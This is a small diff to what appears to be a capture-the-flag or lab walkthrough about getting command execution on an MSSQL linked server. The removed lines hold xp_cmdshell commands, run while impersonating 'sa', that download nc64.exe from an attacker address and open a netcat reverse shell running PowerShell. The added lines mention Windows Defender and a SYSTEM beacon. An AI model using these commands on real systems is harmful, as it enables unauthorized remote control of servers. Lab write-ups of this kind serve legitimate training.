@@ -1103,18 +1103,7 @@ I now have RCE
 
 I cannot send a powershell reverse shell, i think its because the payload is too long
 
-```python
-EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -c wget http://10.10.14.61/nc64.exe -o C:\programdata\nc64.exe'';') AT [PRIMARY];
-```
+I have tried with nc64.exe and i think defender is running
 
-Ill transfer netcat to the target, using a python web server
+# SYSTEM beacon on `primary`
 
-```python
-penelope -p 1337
-```
-
-Then set a listener
-
-```python
-EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''C:\programdata\nc64.exe 10.10.14.61 1337 -e powershell'';') AT [PRIMARY];
-```
